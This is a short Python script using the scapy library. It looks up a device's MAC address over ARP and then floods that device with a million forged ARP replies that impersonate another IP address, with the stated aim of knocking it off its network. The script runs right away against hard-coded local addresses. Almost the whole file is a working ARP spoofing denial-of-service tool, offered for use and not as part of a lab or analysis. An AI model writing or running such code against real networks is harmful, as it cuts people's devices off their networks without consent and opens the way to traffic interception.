#!/usr/bin/env python3
import scapy.all as scapy

# This function sends an ARP request to the specified IP address,
# and returns the MAC address of the device that responds.
def get_mac(ip):
    # Create an ARP request packet targeting the specified IP
    arp_request = scapy.ARP(pdst=ip)
    # Create an Ethernet frame with a broadcast destination MAC address
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    # Combine the ARP request and Ethernet frame into a single packet
    arp_request_broadcast = broadcast / arp_request
    # Send the packet and get the response
    answered_list = scapy.srp(arp_request_broadcast, timeout=5, verbose=False)[0]
    # Return the MAC address of the first device in the list of responses
    return answered_list[0][1].hwsrc

# This function drops down the network of the target device by flooding it with spoofing packets.
def drop_down_network(target_ip, spoof_ip):
    # Get the MAC address of the target device
    target_mac = get_mac(target_ip)
    # Create an ARP spoofing packet pretending to be the spoof IP
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    # Send a large number of packets to the target device
    scapy.send(packet, verbose=False, count=1000000)

# Test the function
drop_down_network('192.168.0.196', '192.168.0.50')
